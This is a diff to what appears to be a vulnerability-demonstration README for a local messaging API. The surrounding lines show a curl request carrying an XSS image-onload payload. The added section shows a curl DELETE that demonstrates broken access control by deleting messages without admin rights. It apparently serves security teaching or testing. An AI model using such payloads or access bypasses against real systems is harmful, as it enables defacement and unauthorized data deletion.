@@ -20,3 +20,12 @@ curl -X POST "http://localhost:8080/api/messages" \
   -d "{\"message\": \"<img onLoad=(alert('pwned')) src=\\\"./favicon.ico\\\" />\"}" \
   -v && echo ""
 ```
+
+## Broken access control
+
+```bash
+# Delete any message without admin privileges
+curl -X DELETE "http://localhost:8080/api/messages/<messageId>" \
+  -H "Authorization: Bearer <token>" \
+  -v && echo ""
+```
